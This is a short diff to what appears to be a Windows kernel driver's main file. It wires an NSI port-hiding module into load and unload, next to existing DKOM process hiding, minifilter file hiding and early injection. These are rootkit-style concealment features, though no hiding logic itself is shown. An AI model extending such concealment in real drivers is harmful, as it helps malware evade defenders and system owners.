@@ -5,6 +5,7 @@
 #include "Injection/EarlyInjection.h"
 #include "FileHide/FileHide.h"
 #include "DKOM/ProcessHide.h"
+#include "NSI/PortHide.h"
 
 #pragma comment(lib, "aux_klib.lib")
 #pragma comment(lib, "fltMgr.lib")
@@ -85,6 +86,9 @@ void DioProcessUnload(PDRIVER_OBJECT DriverObject)
 
 	// Clean up DKOM process hiding (unhide all before unload)
 	ProcessHide_Cleanup();
+
+	// Clean up NSI port hiding
+	PortHide_Cleanup();
 
 	// Clean up file hiding minifilter
 	FileHide_Cleanup();
@@ -208,6 +212,14 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 	{
 		KdPrint((DRIVER_PREFIX "FileHide initialization failed (0x%X) - file hiding unavailable\n", status));
 		// Continue loading - file hiding is optional
+	}
+
+	// Initialize NSI port hiding (non-fatal if it fails)
+	status = PortHide_Init(DriverObject);
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint((DRIVER_PREFIX "PortHide initialization failed (0x%X) - port hiding unavailable\n", status));
+		// Continue loading - port hiding is optional
 	}
 
 	DriverObject->DriverUnload = DioProcessUnload;
